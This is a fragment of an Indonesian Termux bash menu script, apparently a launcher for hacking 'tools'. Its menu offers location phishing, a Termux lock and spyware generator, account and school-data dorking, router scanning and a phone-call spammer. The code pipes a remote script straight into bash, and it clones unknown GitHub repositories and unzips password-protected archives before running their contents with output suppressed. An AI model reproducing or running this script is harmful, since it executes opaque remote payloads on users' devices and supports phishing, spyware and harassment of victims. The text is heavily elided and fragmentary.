...
echo -e "${r} [ ${g}86 ${r}] ${c}Pshing Lokasi auto URL "
...
echo -e "${r} [ ${g}68 ${r}] ${c}Kalender Tools Termux "
}
ENC() {
mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
sleep 1
...
echo -e "${r} [ ${g}04 ${r}] ${c}Generator Termux Lock & Spyware "
echo -e "${r} [ ${g}05 ${r}] ${c}Dork Github Akun "
echo -e "${r} [ ${g}06 ${r}] ${c}Tema Termux Pro "
echo -e "${r} [ ${g}07 ${r}] ${c}Dork Npsn Sekolah "
echo -e "${r} [ ${g}08 ${r}] ${c}Scanner UDP Router WiFite "
...
echo -e "${r} [ ${g}23 ${r}] ${c}Spammer Calme Number "
...
echo -e "$w➜ Jumlah pengguna ${c}:${y} $((JML + 0)) "
...
echo ""
echo -e "${r}Tekan Enter buat keluar.${n}"
read
}
TARGET="192.168.1.1"
echo -e "${r}
...
"
echo ""
echo -e "${r}[ ${g}✓ ${r}]${c} Spammer call sukses !! "
echo ""
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
...
echo -e "${p} Development ${g}: ${c}Thxyzz404"
echo ""
echo -e "${r}[${y} 1 ${r}] ${g}Cek IMEI V1 ${a}# Versi cek detail. "
echo -e "${r}[${y} 2 ${r}] ${g}Cek IMEI V2 ${a}# Versi cek non detail. "
echo -e "${r}[${y} 3 ${r}] ${b}Keluar "
}
cek_1() {
clear
PFERFIX="$HOME"
...
if [ -d "$ANK_IDIOT" ]; then
    ...
    if [ -f "app.sh" ]; then
        ...
        memek "${r}[ ${g}✓ ${r}]${c} Sedang menjalankan tools..!!"
        echo ""
        bash app.sh || kontol "Terjadi kesalahan."
    else
        echo ""
        memek "${r}[ ${g}+ ${r}]${y} File tidak ada, mengclone ulang..!!${c}"
        echo ""
        ...
        git clone --depth=32 https://github.com/QrwszXnXnchommed0e56/Bacot_Ajg || kontol "Gagal cloning repository"
        cd "$ANK_IDIOT" || kontol "Gagal masuk ke direktori github."
        bash app.sh || kontol "Terjadi kesalahan saat menjalankan."
    fi
else
    memek "${r}[ ${g}+ ${r}]${g} Mengclone repository github..!!${c}"
    echo ""
...
clear
  ;;
      45)
            ...
            sleep 2
            clear 
bash <(curl -sL 'https://mmkmeratusueidukdukfromkeyloardanco.vercel.app/ih_gk_suka_gelay.sh')
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
...
upgrade_pip() {
    clear
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} Mengupgrade pip..!!"
    echo ""
...
if [ -d "$ANK_IDIOT" ]; then
    ...
    if [ -f "$PEJU" ]; then
        ...
        git clone --depth 32 https://github.com/Zero556723/.DZIP "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
        cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
        unzip -o -P "Dancok_989_Dec_Asu_Tai" ZIP >/dev/null 2>&1 || kontol "Ada Maslah."
        chmod +x Wok.py
        python3 "$PEJU" || kontol "Terjadi kesalahan."
    fi
else
...
if [ -d "$ANK_IDIOT" ]; then
    ...
    if [ -f "$PEJU" ]; then
        ...
        git clone --depth 32 https://github.com/Zero556723/.DZIP "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
        cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
        unzip -o -P "TAI_989_DEKODER_267_KONTOL" BEGO.sh >/dev/null 2>&1 || kontol "Ada Maslah."
        chmod +x Wlet.sh
        bash "$PEJU" || kontol "Terjadi kesalahan."
    fi
else
